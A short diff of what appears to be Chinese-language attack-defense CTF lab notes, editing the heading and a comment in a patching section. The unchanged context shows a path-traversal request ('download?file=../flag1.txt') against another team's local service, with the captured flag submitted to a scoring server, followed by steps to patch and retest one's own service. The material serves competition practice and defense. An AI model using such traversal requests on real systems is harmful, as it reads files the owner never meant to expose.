@@ -21,9 +21,9 @@
 ## `F=$(curl -s 'localhost:8002/download?file=../flag1.txt')`
 ## `echo $F`
 ## `curl -s -o /dev/null -w '%{http_code}\n' -d "flag=$F" localhost:8080/submit`
-## 补丁
+## 打补丁
 ### `vi target/app.py`
-### `docker compose up --d --build target-a`
+### `docker compose up --d --build target-a(自己的服务)`
 ### `curl -s 'localhost:8001/download?file=../flag1.txt'`
 ### `curl -s 'localhost:8001/download?file=welcome.txt'`
 
